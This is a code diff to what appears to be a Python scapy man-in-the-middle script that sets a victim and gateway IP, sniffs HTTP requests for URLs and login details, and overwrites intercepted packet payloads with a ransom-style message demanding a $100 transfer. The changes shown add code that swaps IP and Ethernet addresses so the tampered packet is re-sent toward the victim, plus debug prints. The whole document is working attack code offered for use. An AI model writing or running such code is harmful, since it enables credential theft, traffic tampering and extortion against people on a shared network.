@@ -4,8 +4,8 @@ import argparse
 from scapy_http import http
 
 
-gateway_ip = "192.168.1.1" 
-target_ip = "192.168.1.155"
+gateway_ip = "192.168.105.138" 
+target_ip = "192.168.105.246"
 #pktSniffed
 
 #   Sniff.py
@@ -30,6 +30,7 @@ def get_login_info(packet):
 
 
 def process_sniffed_packet(packet):
+    print("sucess")
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] HTTP Request >> " + url.decode("utf-8"))
@@ -47,7 +48,21 @@ def process_sniffed_packet(packet):
                 
                 nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
                 packet.getlayer(scapy.packet.Raw).load=nPayload
+                print(packet.getlayer(Ethernet).src)
                 print(packet.getlayer(scapy.packet.Raw).load)
+
+                buffIpdst = packet.getlayer(IP).dst
+                buffIpsrc = packet.getlayer(IP).src
+                buffEthdst = packet.getlayer(Ethernet).dst
+                buffEthsrc = packet.getlayer(Ethernet).src
+
+                packet.getlayer(IP).dst = buffIpsrc
+                packet.getlayer(IP).src = buffIpdst
+                packet.getlayer(Ethernet).dst = buffEthsrc
+                packet.getlayer(Ethernet).src = buffEthdst
+
+
+
                 send(packet,ttl=1,count=10)
                 
                 #print(arp_request_broadcast.payload.layers())
